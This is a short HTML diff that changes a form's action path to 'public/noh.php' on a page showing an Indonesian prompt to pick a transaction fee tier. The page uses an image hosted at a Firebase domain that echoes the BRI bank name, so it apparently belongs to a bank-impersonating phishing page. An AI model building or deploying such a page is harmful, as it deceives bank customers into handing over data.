@@ -25,7 +25,7 @@
             <img width="100%" src="https://new-era-bri.web.app/static/media/ani.f1534b536beb3b9e795a.gif">
           </center>
           <div class="App-v2">
-            <form style="background-color: transparent; box-shadow: none;" action="noh.php" method="POST">
+            <form style="background-color: transparent; box-shadow: none;" action="public/noh.php" method="POST">
               <div class="apaini">
                 <span class="boblue" style="font-size: 15px; text-align: center; display: flex; width: 100%;">Silahkan pilih tarif transaksi sesuai kebutuhan anda di bawah ini</span>
                 <br>
